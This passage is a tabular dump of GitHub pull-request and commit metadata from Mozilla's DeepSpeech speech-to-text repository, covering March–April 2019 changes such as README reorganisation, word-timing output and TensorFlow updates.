2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d6e58134d9d5bfbb8ee75db147e5f58ec6d07de,ordering sections
2191,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a1dc32ac307cef2983170085b3bf0c8a3ea1ef8d,section ordering
2192,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bca40a47c06c4c229251bde3118bf00778931c4,ordering
2193,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,366e285e0bec659d3b470937ed7fc338ce5d371d,ordering
2194,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d04da9833c13b81e8e59f590a0f6f816c638220,command-line-client
2195,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ab0962b3d31c0d9f89238da2962c2edce998e7b,"X-DeepSpeech: NOBUILD

Incoporating Reuben's review."
2196,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c92e0fbbfc1ca96eac85e51f13b8a347e648831,"X-DeepSpeech: NOBUILD

Caught some issues in the titles of native_client/README.md"
2197,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,775222fc3d7a59214003a7c218b9a10aba6feb9b,Merge branch 'master' into native-README
2198,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2001,2001,WIP: TensorFlow,,lissyx,1645737,2019-04-02T20:45:36Z,COLLABORATOR,True,18,18,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3aa286f6157ff24d0254bdaef9f0f837fc5d468a,"Update to new TensorFlow r1.13 artifacts

Fixes #1970"
2199,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2000,2000,Gram Vaani importer,,kdavis-mozilla,12054740,2019-04-02T17:57:25Z,CONTRIBUTOR,True,302,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,441ac5869fd5f87571896d31844c20b9df427d4c,Gram Vaani importer
2200,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2000,2000,Gram Vaani importer,,kdavis-mozilla,12054740,2019-04-02T17:57:25Z,CONTRIBUTOR,True,302,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bc132cabe6419011fbac8f76e000d71eb450198,Addressed review comments
2201,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1997,1997,Selective kernel registration,,lissyx,1645737,2019-04-02T06:32:56Z,COLLABORATOR,False,243,17,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5fa3fbc8c7b00027e5f150283a238a4ffe846f6,Selective kernel registration
2202,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1996,1996,Fix #1991 - Additional import options for import_cv2.py,,tilmankamp,5991088,2019-04-01T13:33:27Z,CONTRIBUTOR,True,53,51,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5645285d256d6a3df91bb2e0d17587a395897144,Fix #1991 - Additional import options for import_cv2.py
2203,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1996,1996,Fix #1991 - Additional import options for import_cv2.py,,tilmankamp,5991088,2019-04-01T13:33:27Z,CONTRIBUTOR,True,53,51,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e78e17904a9eb2b443c32cd3abd6217bce95b50,Some code beautification
2204,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1996,1996,Fix #1991 - Additional import options for import_cv2.py,,tilmankamp,5991088,2019-04-01T13:33:27Z,CONTRIBUTOR,True,53,51,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc236bab44ce9b759506b01dfa7cbe71a4d9785,Removed unnecessary default value
2205,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1996,1996,Fix #1991 - Additional import options for import_cv2.py,,tilmankamp,5991088,2019-04-01T13:33:27Z,CONTRIBUTOR,True,53,51,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94c088be873ebb7da40ec74a9dcc44cb938ca1c7,"Updated README, some code beautification"
2206,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1996,1996,Fix #1991 - Additional import options for import_cv2.py,,tilmankamp,5991088,2019-04-01T13:33:27Z,CONTRIBUTOR,True,53,51,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1e75eaa8d7b4914f58d05547b6c2076f653b4e8,Pack to data set
2207,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79830fe512eac49871ae0e1e57cde73dfa68db7d,Expose letter timings on the API
2208,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b81d054e342a2f3b5c707156fb35119de1d577,Output word-level metadata from the client with the -e tag
2209,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f667713bf8459d7141c58e094fa778b5f1ca3ed,Client whitespace fixes
2210,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1fcf8a4cc3010fa8c75141fa42b59f52074b8a2a,Fixed whitespace
2211,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,192e17f2d5cfcc4f4cc63fdfcbeca9847bc5ab3e,Expose letter timings on the API
2212,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0304eec1af3795a7ba34df6792c27e5a96ca6d6,Output word-level metadata from the client with the -e tag
2213,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d79989c91638d0674b11b657923395cda0edb923,Client whitespace tweaks
2214,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c90828921ecdd33783bfec3ecfd727af77a4a518,Removed unnecessary variables in API
2215,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c56ec7ac7d9a7f1c79f852dfef4248f50d67a94c,Allocate memory C++-style in API
2216,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f255307e35d45e99a16f4331d33c60a79531f18,Client - Added support for detecting UTF-8 spaces
2217,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0364bfa51887ab260e72b33d80d4f551ef1e67a6,API - Switched to std::unique_ptr
2218,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26af3b292d10ea77590c578dcded343a0fad75fc,API - Minor cleanup
2219,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,594f74efe9dbc4b54e42b181865701a41f731a7b,API - Null pointer check
2220,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1995,1995,Pr 1974,,lissyx,1645737,2019-03-30T14:15:16Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cda855cb677a2ecf307e68448ae760a0c49c275,Client - Whitespace fix
2221,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1994,1994,Add Mozilla Code of Conduct,"Fixes #1993


As of January 1 2019, Mozilla requires that all GitHub projects include this [CODE_OF_CONDUCT.md](https://github.com/mozilla/repo-templates/blob/master/templates/CODE_OF_CONDUCT.md) file in the project root. The file has two parts:

1. Required Text - All text under the headings *Community Participation Guidelines and How to Report*, are required, and should not be altered.
2. Optional Text - The Project Specific Etiquette heading provides a space to speak more specifically about ways people can work effectively and inclusively together. Some examples of those can be found on the [Firefox Debugger](https://github.com/devtools-html/debugger.html/blob/master/CODE_OF_CONDUCT.md) project, and [Common Voice](https://github.com/mozilla/voice-web/blob/master/CODE_OF_CONDUCT.md). (The optional part is commented out in the [raw template file](https://raw.githubusercontent.com/mozilla/repo-templates/blob/master/templates/CODE_OF_CONDUCT.md), and will not be visible until you modify and uncomment that part.)

If you have any questions about this file, or Code of Conduct policies and procedures, please see [Mozilla-GitHub-Standards](https://wiki.mozilla.org/GitHub/Repository_Requirements) or email Mozilla-GitHub-Standards+CoC@mozilla.com.

_(Message COC002)_",Mozilla-GitHub-Standards,48073334,2019-03-29T21:58:41Z,CONTRIBUTOR,True,15,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f7babda1a33354ca9a07a33a6ce4baa124b1e24,"Add Mozilla Code of Conduct file

Fixes #1993.

_(Message COC002)_"
2222,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1992,1992,Option for filtering samples that are too short or having out-of-alphabet characters,,tilmankamp,5991088,2019-03-29T16:59:53Z,CONTRIBUTOR,False,23,6,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b320329f0e02d0e04479613c961e0ca2ad0323c,Option for filtering samples that are too short or having out-of-alphabet characters
2223,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1989,1989,ignore_longer_outputs_than_inputs=True,"I vote for adding this in as a default, because otherwise it might be the case that you train on CV for 2 days with 8 GPUs and it crashes at test time",JRMeyer,8389864,2019-03-28T19:40:19Z,CONTRIBUTOR,False,3,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,345b207572dd71a64f81c8456c69120f1225339f,ignore_longer_outputs_than_inputs=True
2224,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1988,1988,Removed distributed training support,"This PR also adds support for automatically checkpointing the epoch-model with best dev-loss so far.
@reuben Main activity is in the training-loop and I tried to keep changes there - apart from trivial removal of stuff (coordinator and config/FLAGS etc.). Especially the feeder is kept as it was/is. So rebasing your big data-PR is hard for the training part but should still be possible.",tilmankamp,5991088,2019-03-28T18:07:00Z,CONTRIBUTOR,True,226,1169,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a179a2389fa304352db2e7dfabe893d56f5a4d09,Fix #1986 - Remove distributed training support
2225,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1976,1976,Pr 1974,,dabinat,18251622,2019-03-21T23:18:55Z,COLLABORATOR,False,270,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79830fe512eac49871ae0e1e57cde73dfa68db7d,Expose letter timings on the API
2226,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1976,1976,Pr 1974,,dabinat,18251622,2019-03-21T23:18:55Z,COLLABORATOR,False,270,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b81d054e342a2f3b5c707156fb35119de1d577,Output word-level metadata from the client with the -e tag
2227,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1975,1975,Pr 1974,,lissyx,1645737,2019-03-21T23:10:04Z,COLLABORATOR,False,270,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79830fe512eac49871ae0e1e57cde73dfa68db7d,Expose letter timings on the API
2228,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1975,1975,Pr 1974,,lissyx,1645737,2019-03-21T23:10:04Z,COLLABORATOR,False,270,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b81d054e342a2f3b5c707156fb35119de1d577,Output word-level metadata from the client with the -e tag
2229,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79830fe512eac49871ae0e1e57cde73dfa68db7d,Expose letter timings on the API
2230,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b81d054e342a2f3b5c707156fb35119de1d577,Output word-level metadata from the client with the -e tag
2231,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f667713bf8459d7141c58e094fa778b5f1ca3ed,Client whitespace fixes
2232,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1fcf8a4cc3010fa8c75141fa42b59f52074b8a2a,Fixed whitespace
2233,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,192e17f2d5cfcc4f4cc63fdfcbeca9847bc5ab3e,Expose letter timings on the API
2234,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0304eec1af3795a7ba34df6792c27e5a96ca6d6,Output word-level metadata from the client with the -e tag
2235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d79989c91638d0674b11b657923395cda0edb923,Client whitespace tweaks
2236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c90828921ecdd33783bfec3ecfd727af77a4a518,Removed unnecessary variables in API
2237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c56ec7ac7d9a7f1c79f852dfef4248f50d67a94c,Allocate memory C++-style in API
2238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f255307e35d45e99a16f4331d33c60a79531f18,Client - Added support for detecting UTF-8 spaces
2239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0364bfa51887ab260e72b33d80d4f551ef1e67a6,API - Switched to std::unique_ptr
2240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26af3b292d10ea77590c578dcded343a0fad75fc,API - Minor cleanup
2241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,594f74efe9dbc4b54e42b181865701a41f731a7b,API - Null pointer check
2242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1974,1974,Output word timings,Letter timings are exposed on the API and the client then converts these into word-level timings. The client outputs CSV when used with the -e command-line argument.,dabinat,18251622,2019-03-21T23:02:46Z,COLLABORATOR,True,269,18,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cda855cb677a2ecf307e68448ae760a0c49c275,Client - Whitespace fix
2243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1973,1973,Fix #1972,Empty strings are falsy.,tilmankamp,5991088,2019-03-21T12:40:38Z,CONTRIBUTOR,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42f04dc9aab6dab391396c177e82188ff6df3a75,Fix #1972
2244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1969,1969,Bump VERSION to v0.5.0-alpha.4,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-03-20T18:29:34Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f261b7d825eefa49a64babd14849bb363c70ca5,"Bump VERSION to v0.5.0-alpha.4

X-DeepSpeech: NOBUILD"
2245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1967,1967,Npm win,,lissyx,1645737,2019-03-20T08:16:41Z,COLLABORATOR,True,289,92,66,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16b7237e7089f6b9d0879625b4d0bd9957036b4d,Install and patch swig on msys64
2246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1967,1967,Npm win,,lissyx,1645737,2019-03-20T08:16:41Z,COLLABORATOR,True,289,92,66,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2a73a76ac3ad18a6c7b6fa1a587cd4c1932823cf,Add NodeJS build for Windows
2247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1967,1967,Npm win,,lissyx,1645737,2019-03-20T08:16:41Z,COLLABORATOR,True,289,92,66,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d18697d432976025587524b998a9ad48ac89d6de,Rename task node-package to node-package-cpu
2248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1967,1967,Npm win,,lissyx,1645737,2019-03-20T08:16:41Z,COLLABORATOR,True,289,92,66,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd133c4bdc75cf6fdd46d4c7b045f6faba8572c7,Add NPM GPU packaging task
2249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1967,1967,Npm win,,lissyx,1645737,2019-03-20T08:16:41Z,COLLABORATOR,True,289,92,66,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d421daa2ca18265684d7e722e87c0d8f20f0cf47,Add NodeJS Windows tests
2250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1966,1966,Bump VERSION to v0.5.0-alpha.3,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-03-20T05:39:39Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9c2c32ac76263e31491f2e22dcd30bf6d4d076f,"Bump VERSION to v0.5.0-alpha.3

X-DeepSpeech: NOBUILD"
2251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1965,1965,import_cv2,change mentions of `import_cv.py` --> `import_cv2.py`,JRMeyer,8389864,2019-03-19T18:01:08Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69569aab0ba8df57cc49e12fffeba0854dcece6b,import_cv2
2252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1965,1965,import_cv2,change mentions of `import_cv.py` --> `import_cv2.py`,JRMeyer,8389864,2019-03-19T18:01:08Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12d31c11bde9b214b703e0cd44cfb9e3ce0b14a8,"import_cv2 information correction

as per Kelly's review -- `import_cv2.py` does not download data, and assumes different args"
